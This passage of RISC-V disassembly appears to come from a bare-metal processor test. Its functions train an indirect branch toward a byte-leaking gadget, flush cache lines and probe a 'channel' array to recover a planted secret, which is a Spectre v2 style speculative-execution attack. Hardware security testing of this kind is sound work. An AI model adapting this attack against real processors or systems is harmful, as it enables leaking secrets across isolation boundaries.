    80000728:	00010717          	auipc	a4,0x10
    8000072c:	8d870713          	addi	a4,a4,-1832 # 80010000 <leaked_idx>
    80000730:	00010797          	auipc	a5,0x10
    80000734:	8d078793          	addi	a5,a5,-1840 # 80010000 <leaked_idx>
    80000738:	0789                	addi	a5,a5,2
    8000073a:	4659                	li	a2,22
    8000073c:	85be                	mv	a1,a5
    8000073e:	853a                	mv	a0,a4
    80000740:	e77ff0ef          	jal	800005b6 <map_identity_range>
    80000744:	87aa                	mv	a5,a0
    80000746:	c795                	beqz	a5,80000772 <install_priv_page_table+0x156>
    80000748:	00005517          	auipc	a0,0x5
    8000074c:	62050513          	addi	a0,a0,1568 # 80005d68 <printf_+0x62>
    80000750:	9f1ff0ef          	jal	80000140 <putstr>
    80000754:	00005517          	auipc	a0,0x5
    80000758:	7bc50513          	addi	a0,a0,1980 # 80005f10 <printf_+0x20a>
    8000075c:	9e5ff0ef          	jal	80000140 <putstr>
    80000760:	00005517          	auipc	a0,0x5
    80000764:	7c850513          	addi	a0,a0,1992 # 80005f28 <printf_+0x222>
    80000768:	9d9ff0ef          	jal	80000140 <putstr>
    8000076c:	4505                	li	a0,1
    8000076e:	0c8030ef          	jal	80003836 <_halt>
    80000772:	00011717          	auipc	a4,0x11
    80000776:	88e70713          	addi	a4,a4,-1906 # 80011000 <leaked_score>
    8000077a:	00011797          	auipc	a5,0x11
    8000077e:	88678793          	addi	a5,a5,-1914 # 80011000 <leaked_score>
    80000782:	07c1                	addi	a5,a5,16
    80000784:	4659                	li	a2,22
    80000786:	85be                	mv	a1,a5
    80000788:	853a                	mv	a0,a4
    8000078a:	e2dff0ef          	jal	800005b6 <map_identity_range>
    8000078e:	87aa                	mv	a5,a0
    80000790:	c795                	beqz	a5,800007bc <install_priv_page_table+0x1a0>
    80000792:	00005517          	auipc	a0,0x5
    80000796:	5d650513          	addi	a0,a0,1494 # 80005d68 <printf_+0x62>
    8000079a:	9a7ff0ef          	jal	80000140 <putstr>
    8000079e:	00005517          	auipc	a0,0x5
    800007a2:	7fa50513          	addi	a0,a0,2042 # 80005f98 <printf_+0x292>
    800007a6:	99bff0ef          	jal	80000140 <putstr>
    800007aa:	00006517          	auipc	a0,0x6
    800007ae:	80650513          	addi	a0,a0,-2042 # 80005fb0 <printf_+0x2aa>
    800007b2:	98fff0ef          	jal	80000140 <putstr>
    800007b6:	4505                	li	a0,1
    800007b8:	07e030ef          	jal	80003836 <_halt>
    800007bc:	00012717          	auipc	a4,0x12
    800007c0:	84470713          	addi	a4,a4,-1980 # 80012000 <leaked_top_idx>
    800007c4:	00013797          	auipc	a5,0x13
    800007c8:	83c78793          	addi	a5,a5,-1988 # 80013000 <leaked_top_score>
    800007cc:	02078793          	addi	a5,a5,32
    800007d0:	4659                	li	a2,22
    800007d2:	85be                	mv	a1,a5
    800007d4:	853a                	mv	a0,a4
    800007d6:	de1ff0ef          	jal	800005b6 <map_identity_range>
    800007da:	87aa                	mv	a5,a0
    800007dc:	c795                	beqz	a5,80000808 <install_priv_page_table+0x1ec>
    800007de:	00005517          	auipc	a0,0x5
    800007e2:	58a50513          	addi	a0,a0,1418 # 80005d68 <printf_+0x62>
    800007e6:	95bff0ef          	jal	80000140 <putstr>
    800007ea:	00006517          	auipc	a0,0x6
    800007ee:	83650513          	addi	a0,a0,-1994 # 80006020 <printf_+0x31a>
    800007f2:	94fff0ef          	jal	80000140 <putstr>
    800007f6:	00006517          	auipc	a0,0x6
    800007fa:	84250513          	addi	a0,a0,-1982 # 80006038 <printf_+0x332>
    800007fe:	943ff0ef          	jal	80000140 <putstr>
    80000802:	4505                	li	a0,1
    80000804:	032030ef          	jal	80003836 <_halt>
    80000808:	00013697          	auipc	a3,0x13
    8000080c:	7f868693          	addi	a3,a3,2040 # 80014000 <leaked_hits>
    80000810:	00013717          	auipc	a4,0x13
    80000814:	7f070713          	addi	a4,a4,2032 # 80014000 <leaked_hits>
    80000818:	28b01793          	bseti	a5,zero,0xb
    8000081c:	97ba                	add	a5,a5,a4
    8000081e:	4659                	li	a2,22
    80000820:	85be                	mv	a1,a5
    80000822:	8536                	mv	a0,a3
    80000824:	d93ff0ef          	jal	800005b6 <map_identity_range>
    80000828:	87aa                	mv	a5,a0
    8000082a:	c795                	beqz	a5,80000856 <install_priv_page_table+0x23a>
    8000082c:	00005517          	auipc	a0,0x5
    80000830:	53c50513          	addi	a0,a0,1340 # 80005d68 <printf_+0x62>
    80000834:	90dff0ef          	jal	80000140 <putstr>
    80000838:	00006517          	auipc	a0,0x6
    8000083c:	87050513          	addi	a0,a0,-1936 # 800060a8 <printf_+0x3a2>
    80000840:	901ff0ef          	jal	80000140 <putstr>
    80000844:	00006517          	auipc	a0,0x6
    80000848:	87c50513          	addi	a0,a0,-1924 # 800060c0 <printf_+0x3ba>
    8000084c:	8f5ff0ef          	jal	80000140 <putstr>
    80000850:	4505                	li	a0,1
    80000852:	7e5020ef          	jal	80003836 <_halt>
    80000856:	00014717          	auipc	a4,0x14
    8000085a:	7aa70713          	addi	a4,a4,1962 # 80015000 <tries_used>
    8000085e:	00014797          	auipc	a5,0x14
    80000862:	7a278793          	addi	a5,a5,1954 # 80015000 <tries_used>
    80000866:	07a1                	addi	a5,a5,8
    80000868:	4659                	li	a2,22
    8000086a:	85be                	mv	a1,a5
    8000086c:	853a                	mv	a0,a4
    8000086e:	d49ff0ef          	jal	800005b6 <map_identity_range>
    80000872:	87aa                	mv	a5,a0
    80000874:	c795                	beqz	a5,800008a0 <install_priv_page_table+0x284>
    80000876:	00005517          	auipc	a0,0x5
    8000087a:	4f250513          	addi	a0,a0,1266 # 80005d68 <printf_+0x62>
    8000087e:	8c3ff0ef          	jal	80000140 <putstr>
    80000882:	00006517          	auipc	a0,0x6
    80000886:	8ae50513          	addi	a0,a0,-1874 # 80006130 <printf_+0x42a>
    8000088a:	8b7ff0ef          	jal	80000140 <putstr>
    8000088e:	00006517          	auipc	a0,0x6
    80000892:	8ba50513          	addi	a0,a0,-1862 # 80006148 <printf_+0x442>
    80000896:	8abff0ef          	jal	80000140 <putstr>
    8000089a:	4505                	li	a0,1
    8000089c:	79b020ef          	jal	80003836 <_halt>
    800008a0:	00015717          	auipc	a4,0x15
    800008a4:	76070713          	addi	a4,a4,1888 # 80016000 <active_threshold>
    800008a8:	00019797          	auipc	a5,0x19
    800008ac:	75878793          	addi	a5,a5,1880 # 8001a000 <direct_secret_read_value>
    800008b0:	07a1                	addi	a5,a5,8
    800008b2:	4659                	li	a2,22
    800008b4:	85be                	mv	a1,a5
    800008b6:	853a                	mv	a0,a4
    800008b8:	cffff0ef          	jal	800005b6 <map_identity_range>
    800008bc:	87aa                	mv	a5,a0
    800008be:	c795                	beqz	a5,800008ea <install_priv_page_table+0x2ce>
    800008c0:	00005517          	auipc	a0,0x5
    800008c4:	4a850513          	addi	a0,a0,1192 # 80005d68 <printf_+0x62>
    800008c8:	879ff0ef          	jal	80000140 <putstr>
    800008cc:	00006517          	auipc	a0,0x6
    800008d0:	8ec50513          	addi	a0,a0,-1812 # 800061b8 <printf_+0x4b2>
    800008d4:	86dff0ef          	jal	80000140 <putstr>
    800008d8:	00006517          	auipc	a0,0x6
    800008dc:	8f850513          	addi	a0,a0,-1800 # 800061d0 <printf_+0x4ca>
    800008e0:	861ff0ef          	jal	80000140 <putstr>
    800008e4:	4505                	li	a0,1
    800008e6:	751020ef          	jal	80003836 <_halt>
    800008ea:	00006717          	auipc	a4,0x6
    800008ee:	71670713          	addi	a4,a4,1814 # 80007000 <secret>
    800008f2:	00006797          	auipc	a5,0x6
    800008f6:	71678793          	addi	a5,a5,1814 # 80007008 <target_value>
    800008fa:	07a1                	addi	a5,a5,8
    800008fc:	4619                	li	a2,6
    800008fe:	85be                	mv	a1,a5
    80000900:	853a                	mv	a0,a4
    80000902:	cb5ff0ef          	jal	800005b6 <map_identity_range>
    80000906:	87aa                	mv	a5,a0
    80000908:	c795                	beqz	a5,80000934 <install_priv_page_table+0x318>
    8000090a:	00005517          	auipc	a0,0x5
    8000090e:	45e50513          	addi	a0,a0,1118 # 80005d68 <printf_+0x62>
    80000912:	82fff0ef          	jal	80000140 <putstr>
    80000916:	00006517          	auipc	a0,0x6
    8000091a:	92a50513          	addi	a0,a0,-1750 # 80006240 <printf_+0x53a>
    8000091e:	823ff0ef          	jal	80000140 <putstr>
    80000922:	00006517          	auipc	a0,0x6
    80000926:	93650513          	addi	a0,a0,-1738 # 80006258 <printf_+0x552>
    8000092a:	817ff0ef          	jal	80000140 <putstr>
    8000092e:	4505                	li	a0,1
    80000930:	707020ef          	jal	80003836 <_halt>
    80000934:	00006717          	auipc	a4,0x6
    80000938:	70c70713          	addi	a4,a4,1804 # 80007040 <v2_train_root>
    8000093c:	00006797          	auipc	a5,0x6
    80000940:	70478793          	addi	a5,a5,1796 # 80007040 <v2_train_root>
    80000944:	07a1                	addi	a5,a5,8
    80000946:	4619                	li	a2,6
    80000948:	85be                	mv	a1,a5
    8000094a:	853a                	mv	a0,a4
    8000094c:	c6bff0ef          	jal	800005b6 <map_identity_range>
    80000950:	87aa                	mv	a5,a0
    80000952:	c795                	beqz	a5,8000097e <install_priv_page_table+0x362>
    80000954:	00005517          	auipc	a0,0x5
    80000958:	41450513          	addi	a0,a0,1044 # 80005d68 <printf_+0x62>
    8000095c:	fe4ff0ef          	jal	80000140 <putstr>
    80000960:	00006517          	auipc	a0,0x6
    80000964:	96850513          	addi	a0,a0,-1688 # 800062c8 <printf_+0x5c2>
    80000968:	fd8ff0ef          	jal	80000140 <putstr>
    8000096c:	00006517          	auipc	a0,0x6
    80000970:	97c50513          	addi	a0,a0,-1668 # 800062e8 <printf_+0x5e2>
    80000974:	fccff0ef          	jal	80000140 <putstr>
    80000978:	4505                	li	a0,1
    8000097a:	6bd020ef          	jal	80003836 <_halt>
    8000097e:	00006717          	auipc	a4,0x6
    80000982:	70270713          	addi	a4,a4,1794 # 80007080 <v2_train_mid>
    80000986:	00006797          	auipc	a5,0x6
    8000098a:	6fa78793          	addi	a5,a5,1786 # 80007080 <v2_train_mid>
    8000098e:	07a1                	addi	a5,a5,8
    80000990:	4619                	li	a2,6
    80000992:	85be                	mv	a1,a5
    80000994:	853a                	mv	a0,a4
    80000996:	c21ff0ef          	jal	800005b6 <map_identity_range>
    8000099a:	87aa                	mv	a5,a0
    8000099c:	c795                	beqz	a5,800009c8 <install_priv_page_table+0x3ac>
    8000099e:	00005517          	auipc	a0,0x5
    800009a2:	3ca50513          	addi	a0,a0,970 # 80005d68 <printf_+0x62>
    800009a6:	f9aff0ef          	jal	80000140 <putstr>
    800009aa:	00006517          	auipc	a0,0x6
    800009ae:	9ae50513          	addi	a0,a0,-1618 # 80006358 <printf_+0x652>
    800009b2:	f8eff0ef          	jal	80000140 <putstr>
    800009b6:	00006517          	auipc	a0,0x6
    800009ba:	9ba50513          	addi	a0,a0,-1606 # 80006370 <printf_+0x66a>
    800009be:	f82ff0ef          	jal	80000140 <putstr>
    800009c2:	4505                	li	a0,1
    800009c4:	673020ef          	jal	80003836 <_halt>
    800009c8:	00006717          	auipc	a4,0x6
    800009cc:	6f870713          	addi	a4,a4,1784 # 800070c0 <v2_train_node>
    800009d0:	00006797          	auipc	a5,0x6
    800009d4:	6f078793          	addi	a5,a5,1776 # 800070c0 <v2_train_node>
    800009d8:	07a1                	addi	a5,a5,8
    800009da:	4619                	li	a2,6
    800009dc:	85be                	mv	a1,a5
    800009de:	853a                	mv	a0,a4
    800009e0:	bd7ff0ef          	jal	800005b6 <map_identity_range>
    800009e4:	87aa                	mv	a5,a0
    800009e6:	c795                	beqz	a5,80000a12 <install_priv_page_table+0x3f6>
    800009e8:	00005517          	auipc	a0,0x5
    800009ec:	38050513          	addi	a0,a0,896 # 80005d68 <printf_+0x62>
    800009f0:	f50ff0ef          	jal	80000140 <putstr>
    800009f4:	00006517          	auipc	a0,0x6
    800009f8:	9ec50513          	addi	a0,a0,-1556 # 800063e0 <printf_+0x6da>
    800009fc:	f44ff0ef          	jal	80000140 <putstr>
    80000a00:	00006517          	auipc	a0,0x6
    80000a04:	a0050513          	addi	a0,a0,-1536 # 80006400 <printf_+0x6fa>
    80000a08:	f38ff0ef          	jal	80000140 <putstr>
    80000a0c:	4505                	li	a0,1
    80000a0e:	629020ef          	jal	80003836 <_halt>
    80000a12:	00006717          	auipc	a4,0x6
    80000a16:	6ee70713          	addi	a4,a4,1774 # 80007100 <v2_attack_root>
    80000a1a:	00006797          	auipc	a5,0x6
    80000a1e:	6e678793          	addi	a5,a5,1766 # 80007100 <v2_attack_root>
    80000a22:	07a1                	addi	a5,a5,8
    80000a24:	4619                	li	a2,6
    80000a26:	85be                	mv	a1,a5
    80000a28:	853a                	mv	a0,a4
    80000a2a:	b8dff0ef          	jal	800005b6 <map_identity_range>
    80000a2e:	87aa                	mv	a5,a0
    80000a30:	c795                	beqz	a5,80000a5c <install_priv_page_table+0x440>
    80000a32:	00005517          	auipc	a0,0x5
    80000a36:	33650513          	addi	a0,a0,822 # 80005d68 <printf_+0x62>
    80000a3a:	f06ff0ef          	jal	80000140 <putstr>
    80000a3e:	00006517          	auipc	a0,0x6
    80000a42:	a3250513          	addi	a0,a0,-1486 # 80006470 <printf_+0x76a>
    80000a46:	efaff0ef          	jal	80000140 <putstr>
    80000a4a:	00006517          	auipc	a0,0x6
    80000a4e:	a4650513          	addi	a0,a0,-1466 # 80006490 <printf_+0x78a>
    80000a52:	eeeff0ef          	jal	80000140 <putstr>
    80000a56:	4505                	li	a0,1
    80000a58:	5df020ef          	jal	80003836 <_halt>
    80000a5c:	00006717          	auipc	a4,0x6
    80000a60:	6e470713          	addi	a4,a4,1764 # 80007140 <v2_attack_mid>
    80000a64:	00006797          	auipc	a5,0x6
    80000a68:	6dc78793          	addi	a5,a5,1756 # 80007140 <v2_attack_mid>
    80000a6c:	07a1                	addi	a5,a5,8
    80000a6e:	4619                	li	a2,6
    80000a70:	85be                	mv	a1,a5
    80000a72:	853a                	mv	a0,a4
    80000a74:	b43ff0ef          	jal	800005b6 <map_identity_range>
    80000a78:	87aa                	mv	a5,a0
    80000a7a:	c795                	beqz	a5,80000aa6 <install_priv_page_table+0x48a>
    80000a7c:	00005517          	auipc	a0,0x5
    80000a80:	2ec50513          	addi	a0,a0,748 # 80005d68 <printf_+0x62>
    80000a84:	ebcff0ef          	jal	80000140 <putstr>
    80000a88:	00006517          	auipc	a0,0x6
    80000a8c:	a7850513          	addi	a0,a0,-1416 # 80006500 <printf_+0x7fa>
    80000a90:	eb0ff0ef          	jal	80000140 <putstr>
    80000a94:	00006517          	auipc	a0,0x6
    80000a98:	a8c50513          	addi	a0,a0,-1396 # 80006520 <printf_+0x81a>
    80000a9c:	ea4ff0ef          	jal	80000140 <putstr>
    80000aa0:	4505                	li	a0,1
    80000aa2:	595020ef          	jal	80003836 <_halt>
    80000aa6:	00006717          	auipc	a4,0x6
    80000aaa:	6da70713          	addi	a4,a4,1754 # 80007180 <v2_attack_node>
    80000aae:	00006797          	auipc	a5,0x6
    80000ab2:	6d278793          	addi	a5,a5,1746 # 80007180 <v2_attack_node>
    80000ab6:	07a1                	addi	a5,a5,8
    80000ab8:	4619                	li	a2,6
    80000aba:	85be                	mv	a1,a5
    80000abc:	853a                	mv	a0,a4
    80000abe:	af9ff0ef          	jal	800005b6 <map_identity_range>
    80000ac2:	87aa                	mv	a5,a0
    80000ac4:	c795                	beqz	a5,80000af0 <install_priv_page_table+0x4d4>
    80000ac6:	00005517          	auipc	a0,0x5
    80000aca:	2a250513          	addi	a0,a0,674 # 80005d68 <printf_+0x62>
    80000ace:	e72ff0ef          	jal	80000140 <putstr>
    80000ad2:	00006517          	auipc	a0,0x6
    80000ad6:	abe50513          	addi	a0,a0,-1346 # 80006590 <printf_+0x88a>
    80000ada:	e66ff0ef          	jal	80000140 <putstr>
    80000ade:	00006517          	auipc	a0,0x6
    80000ae2:	ad250513          	addi	a0,a0,-1326 # 800065b0 <printf_+0x8aa>
    80000ae6:	e5aff0ef          	jal	80000140 <putstr>
    80000aea:	4505                	li	a0,1
    80000aec:	54b020ef          	jal	80003836 <_halt>
    80000af0:	00006717          	auipc	a4,0x6
    80000af4:	6d070713          	addi	a4,a4,1744 # 800071c0 <v2_public_dummy>
    80000af8:	00006797          	auipc	a5,0x6
    80000afc:	6c878793          	addi	a5,a5,1736 # 800071c0 <v2_public_dummy>
    80000b00:	0785                	addi	a5,a5,1
    80000b02:	4619                	li	a2,6
    80000b04:	85be                	mv	a1,a5
    80000b06:	853a                	mv	a0,a4
    80000b08:	aafff0ef          	jal	800005b6 <map_identity_range>
    80000b0c:	87aa                	mv	a5,a0
    80000b0e:	c795                	beqz	a5,80000b3a <install_priv_page_table+0x51e>
    80000b10:	00005517          	auipc	a0,0x5
    80000b14:	25850513          	addi	a0,a0,600 # 80005d68 <printf_+0x62>
    80000b18:	e28ff0ef          	jal	80000140 <putstr>
    80000b1c:	00006517          	auipc	a0,0x6
    80000b20:	b0450513          	addi	a0,a0,-1276 # 80006620 <printf_+0x91a>
    80000b24:	e1cff0ef          	jal	80000140 <putstr>
    80000b28:	00006517          	auipc	a0,0x6
    80000b2c:	b1850513          	addi	a0,a0,-1256 # 80006640 <printf_+0x93a>
    80000b30:	e10ff0ef          	jal	80000140 <putstr>
    80000b34:	4505                	li	a0,1
    80000b36:	501020ef          	jal	80003836 <_halt>
    80000b3a:	0001b797          	auipc	a5,0x1b
    80000b3e:	4c678793          	addi	a5,a5,1222 # 8001c000 <root_pt>
    80000b42:	00c7d713          	srli	a4,a5,0xc
    80000b46:	2bf01793          	bseti	a5,zero,0x3f
    80000b4a:	8fd9                	or	a5,a5,a4
    80000b4c:	fef43423          	sd	a5,-24(s0)
    80000b50:	fe843783          	ld	a5,-24(s0)
    80000b54:	18079073          	csrw	satp,a5
    80000b58:	12000073          	sfence.vma
    80000b5c:	0000100f          	fence.i
    80000b60:	0001                	nop
    80000b62:	60e2                	ld	ra,24(sp)
    80000b64:	6442                	ld	s0,16(sp)
    80000b66:	6105                	addi	sp,sp,32
    80000b68:	8082                	ret

0000000080000b6a <gadget>:
    80000b6a:	7179                	addi	sp,sp,-48
    80000b6c:	f422                	sd	s0,40(sp)
    80000b6e:	1800                	addi	s0,sp,48
    80000b70:	fca43c23          	sd	a0,-40(s0)
    80000b74:	fd843783          	ld	a5,-40(s0)
    80000b78:	0007c783          	lbu	a5,0(a5)
    80000b7c:	fef407a3          	sb	a5,-17(s0)
    80000b80:	fef44783          	lbu	a5,-17(s0)
    80000b84:	079a                	slli	a5,a5,0x6
    80000b86:	00007717          	auipc	a4,0x7
    80000b8a:	47a70713          	addi	a4,a4,1146 # 80008000 <channel>
    80000b8e:	97ba                	add	a5,a5,a4
    80000b90:	0007c783          	lbu	a5,0(a5)
    80000b94:	fef40723          	sb	a5,-18(s0)
    80000b98:	0001a797          	auipc	a5,0x1a
    80000b9c:	46878793          	addi	a5,a5,1128 # 8001b000 <m_dummy>
    80000ba0:	0007c783          	lbu	a5,0(a5)
    80000ba4:	0ff7f793          	zext.b	a5,a5
    80000ba8:	fee44703          	lbu	a4,-18(s0)
    80000bac:	8fb9                	xor	a5,a5,a4
    80000bae:	0ff7f713          	zext.b	a4,a5
    80000bb2:	0001a797          	auipc	a5,0x1a
    80000bb6:	44e78793          	addi	a5,a5,1102 # 8001b000 <m_dummy>
    80000bba:	00e78023          	sb	a4,0(a5)
    80000bbe:	fee44783          	lbu	a5,-18(s0)
    80000bc2:	2781                	sext.w	a5,a5
    80000bc4:	853e                	mv	a0,a5
    80000bc6:	7422                	ld	s0,40(sp)
    80000bc8:	6145                	addi	sp,sp,48
    80000bca:	8082                	ret

0000000080000bcc <safe_target>:
    80000bcc:	1101                	addi	sp,sp,-32
    80000bce:	ec22                	sd	s0,24(sp)
    80000bd0:	1000                	addi	s0,sp,32
    80000bd2:	fea43423          	sd	a0,-24(s0)
    80000bd6:	fe843783          	ld	a5,-24(s0)
    80000bda:	2781                	sext.w	a5,a5
    80000bdc:	8b85                	andi	a5,a5,1
    80000bde:	2781                	sext.w	a5,a5
    80000be0:	853e                	mv	a0,a5
    80000be2:	6462                	ld	s0,24(sp)
    80000be4:	6105                	addi	sp,sp,32
    80000be6:	8082                	ret

0000000080000be8 <victim_indirect>:
    80000be8:	7139                	addi	sp,sp,-64
    80000bea:	fc06                	sd	ra,56(sp)
    80000bec:	f822                	sd	s0,48(sp)
    80000bee:	0080                	addi	s0,sp,64
    80000bf0:	fca43423          	sd	a0,-56(s0)
    80000bf4:	87ae                	mv	a5,a1
    80000bf6:	fcf42223          	sw	a5,-60(s0)
    80000bfa:	fe042623          	sw	zero,-20(s0)
    80000bfe:	4785                	li	a5,1
    80000c00:	fef42423          	sw	a5,-24(s0)
    80000c04:	a815                	j	80000c38 <victim_indirect+0x50>
    80000c06:	fc442783          	lw	a5,-60(s0)
    80000c0a:	873e                	mv	a4,a5
    80000c0c:	fe842783          	lw	a5,-24(s0)
    80000c10:	9fb9                	addw	a5,a5,a4
    80000c12:	fcf42223          	sw	a5,-60(s0)
    80000c16:	fc442783          	lw	a5,-60(s0)
    80000c1a:	873e                	mv	a4,a5
    80000c1c:	fe842783          	lw	a5,-24(s0)
    80000c20:	8ff9                	and	a5,a5,a4
    80000c22:	2781                	sext.w	a5,a5
    80000c24:	fec42703          	lw	a4,-20(s0)
    80000c28:	9fb9                	addw	a5,a5,a4
    80000c2a:	fef42623          	sw	a5,-20(s0)
    80000c2e:	fe842783          	lw	a5,-24(s0)
    80000c32:	2785                	addiw	a5,a5,1
    80000c34:	fef42423          	sw	a5,-24(s0)
    80000c38:	fe842783          	lw	a5,-24(s0)
    80000c3c:	0007871b          	sext.w	a4,a5
    80000c40:	04000793          	li	a5,64
    80000c44:	fce7d1e3          	bge	a5,a4,80000c06 <victim_indirect+0x1e>
    80000c48:	00006517          	auipc	a0,0x6
    80000c4c:	3c050513          	addi	a0,a0,960 # 80007008 <target_value>
    80000c50:	d56ff0ef          	jal	800001a6 <xs_flush_cache_line>
    80000c54:	d40ff0ef          	jal	80000194 <xs_fence>
    80000c58:	4785                	li	a5,1
    80000c5a:	fef42223          	sw	a5,-28(s0)
    80000c5e:	a01d                	j	80000c84 <victim_indirect+0x9c>
    80000c60:	fc442783          	lw	a5,-60(s0)
    80000c64:	873e                	mv	a4,a5
    80000c66:	fe442783          	lw	a5,-28(s0)
    80000c6a:	02f747bb          	divw	a5,a4,a5
    80000c6e:	2781                	sext.w	a5,a5
    80000c70:	fec42703          	lw	a4,-20(s0)
    80000c74:	9fb9                	addw	a5,a5,a4
    80000c76:	fef42623          	sw	a5,-20(s0)
    80000c7a:	fe442783          	lw	a5,-28(s0)
    80000c7e:	2785                	addiw	a5,a5,1
    80000c80:	fef42223          	sw	a5,-28(s0)
    80000c84:	fe442783          	lw	a5,-28(s0)
    80000c88:	0007871b          	sext.w	a4,a5
    80000c8c:	47c1                	li	a5,16
    80000c8e:	fce7d9e3          	bge	a5,a4,80000c60 <victim_indirect+0x78>
    80000c92:	00006797          	auipc	a5,0x6
    80000c96:	37678793          	addi	a5,a5,886 # 80007008 <target_value>
    80000c9a:	639c                	ld	a5,0(a5)
    80000c9c:	fcf43c23          	sd	a5,-40(s0)
    80000ca0:	fd843783          	ld	a5,-40(s0)
    80000ca4:	fc843503          	ld	a0,-56(s0)
    80000ca8:	9782                	jalr	a5
    80000caa:	87aa                	mv	a5,a0
    80000cac:	873e                	mv	a4,a5
    80000cae:	fec42783          	lw	a5,-20(s0)
    80000cb2:	8ff9                	and	a5,a5,a4
    80000cb4:	2781                	sext.w	a5,a5
    80000cb6:	853e                	mv	a0,a5
    80000cb8:	70e2                	ld	ra,56(sp)
    80000cba:	7442                	ld	s0,48(sp)
    80000cbc:	6121                	addi	sp,sp,64
    80000cbe:	8082                	ret

0000000080000cc0 <flush_channel_service>:
    80000cc0:	7179                	addi	sp,sp,-48
    80000cc2:	f406                	sd	ra,40(sp)
    80000cc4:	f022                	sd	s0,32(sp)
    80000cc6:	1800                	addi	s0,sp,48
    80000cc8:	fca43c23          	sd	a0,-40(s0)
    80000ccc:	fe043423          	sd	zero,-24(s0)
    80000cd0:	a839                	j	80000cee <flush_channel_service+0x2e>
    80000cd2:	fe843783          	ld	a5,-24(s0)
    80000cd6:	079a                	slli	a5,a5,0x6
    80000cd8:	fd843703          	ld	a4,-40(s0)
    80000cdc:	97ba                	add	a5,a5,a4
    80000cde:	853e                	mv	a0,a5
    80000ce0:	cc6ff0ef          	jal	800001a6 <xs_flush_cache_line>
    80000ce4:	fe843783          	ld	a5,-24(s0)
    80000ce8:	0785                	addi	a5,a5,1
    80000cea:	fef43423          	sd	a5,-24(s0)
    80000cee:	fe843703          	ld	a4,-24(s0)
    80000cf2:	0ff00793          	li	a5,255
    80000cf6:	fce7fee3          	bgeu	a5,a4,80000cd2 <flush_channel_service+0x12>
    80000cfa:	00006517          	auipc	a0,0x6
    80000cfe:	30e50513          	addi	a0,a0,782 # 80007008 <target_value>
    80000d02:	ca4ff0ef          	jal	800001a6 <xs_flush_cache_line>
    80000d06:	c8eff0ef          	jal	80000194 <xs_fence>
    80000d0a:	0001                	nop
    80000d0c:	70a2                	ld	ra,40(sp)
    80000d0e:	7402                	ld	s0,32(sp)
    80000d10:	6145                	addi	sp,sp,48
    80000d12:	8082                	ret

0000000080000d14 <train_service>:
    80000d14:	1101                	addi	sp,sp,-32
    80000d16:	ec06                	sd	ra,24(sp)
    80000d18:	e822                	sd	s0,16(sp)
    80000d1a:	1000                	addi	s0,sp,32
    80000d1c:	4785                	li	a5,1
    80000d1e:	fef405a3          	sb	a5,-21(s0)
    80000d22:	00000717          	auipc	a4,0x0
    80000d26:	e4870713          	addi	a4,a4,-440 # 80000b6a <gadget>
    80000d2a:	00006797          	auipc	a5,0x6
    80000d2e:	2de78793          	addi	a5,a5,734 # 80007008 <target_value>
    80000d32:	e398                	sd	a4,0(a5)
    80000d34:	c60ff0ef          	jal	80000194 <xs_fence>
    80000d38:	47c1                	li	a5,16
    80000d3a:	fef42623          	sw	a5,-20(s0)
    80000d3e:	a0a1                	j	80000d86 <train_service+0x72>
    80000d40:	feb40793          	addi	a5,s0,-21
    80000d44:	4581                	li	a1,0
    80000d46:	853e                	mv	a0,a5
    80000d48:	ea1ff0ef          	jal	80000be8 <victim_indirect>
    80000d4c:	87aa                	mv	a5,a0
    80000d4e:	60479713          	sext.b	a4,a5
    80000d52:	0001a797          	auipc	a5,0x1a
    80000d56:	2ae78793          	addi	a5,a5,686 # 8001b000 <m_dummy>
    80000d5a:	0007c783          	lbu	a5,0(a5)
    80000d5e:	0ff7f793          	zext.b	a5,a5
    80000d62:	60479793          	sext.b	a5,a5
    80000d66:	8fb9                	xor	a5,a5,a4
    80000d68:	60479793          	sext.b	a5,a5
    80000d6c:	0ff7f713          	zext.b	a4,a5
    80000d70:	0001a797          	auipc	a5,0x1a
    80000d74:	29078793          	addi	a5,a5,656 # 8001b000 <m_dummy>
    80000d78:	00e78023          	sb	a4,0(a5)
    80000d7c:	fec42783          	lw	a5,-20(s0)
    80000d80:	37fd                	addiw	a5,a5,-1
    80000d82:	fef42623          	sw	a5,-20(s0)
    80000d86:	fec42783          	lw	a5,-20(s0)
    80000d8a:	2781                	sext.w	a5,a5
    80000d8c:	faf04ae3          	bgtz	a5,80000d40 <train_service+0x2c>
    80000d90:	0001                	nop
    80000d92:	0001                	nop
    80000d94:	60e2                	ld	ra,24(sp)
    80000d96:	6442                	ld	s0,16(sp)
    80000d98:	6105                	addi	sp,sp,32
    80000d9a:	8082                	ret

0000000080000d9c <attack_service>:
    80000d9c:	1101                	addi	sp,sp,-32
    80000d9e:	ec06                	sd	ra,24(sp)
    80000da0:	e822                	sd	s0,16(sp)
    80000da2:	1000                	addi	s0,sp,32
    80000da4:	fea43423          	sd	a0,-24(s0)
    80000da8:	00000717          	auipc	a4,0x0
    80000dac:	e2470713          	addi	a4,a4,-476 # 80000bcc <safe_target>
    80000db0:	00006797          	auipc	a5,0x6
    80000db4:	25878793          	addi	a5,a5,600 # 80007008 <target_value>
    80000db8:	e398                	sd	a4,0(a5)
    80000dba:	00006517          	auipc	a0,0x6
    80000dbe:	24e50513          	addi	a0,a0,590 # 80007008 <target_value>
    80000dc2:	be4ff0ef          	jal	800001a6 <xs_flush_cache_line>
    80000dc6:	bceff0ef          	jal	80000194 <xs_fence>
    80000dca:	4581                	li	a1,0
    80000dcc:	fe843503          	ld	a0,-24(s0)
    80000dd0:	e19ff0ef          	jal	80000be8 <victim_indirect>
    80000dd4:	87aa                	mv	a5,a0
    80000dd6:	60479713          	sext.b	a4,a5
    80000dda:	0001a797          	auipc	a5,0x1a
    80000dde:	22678793          	addi	a5,a5,550 # 8001b000 <m_dummy>
    80000de2:	0007c783          	lbu	a5,0(a5)
    80000de6:	0ff7f793          	zext.b	a5,a5
    80000dea:	60479793          	sext.b	a5,a5
    80000dee:	8fb9                	xor	a5,a5,a4
    80000df0:	60479793          	sext.b	a5,a5
    80000df4:	0ff7f713          	zext.b	a4,a5
    80000df8:	0001a797          	auipc	a5,0x1a
    80000dfc:	20878793          	addi	a5,a5,520 # 8001b000 <m_dummy>
    80000e00:	00e78023          	sb	a4,0(a5)
    80000e04:	0001                	nop
    80000e06:	60e2                	ld	ra,24(sp)
    80000e08:	6442                	ld	s0,16(sp)
    80000e0a:	6105                	addi	sp,sp,32
    80000e0c:	8082                	ret
    80000e0e:	00000013          	nop
    80000e12:	00000013          	nop
    80000e16:	00000013          	nop
    80000e1a:	00000013          	nop
    80000e1e:	00000013          	nop
    80000e22:	00000013          	nop
    80000e26:	00000013          	nop
    80000e2a:	00000013          	nop
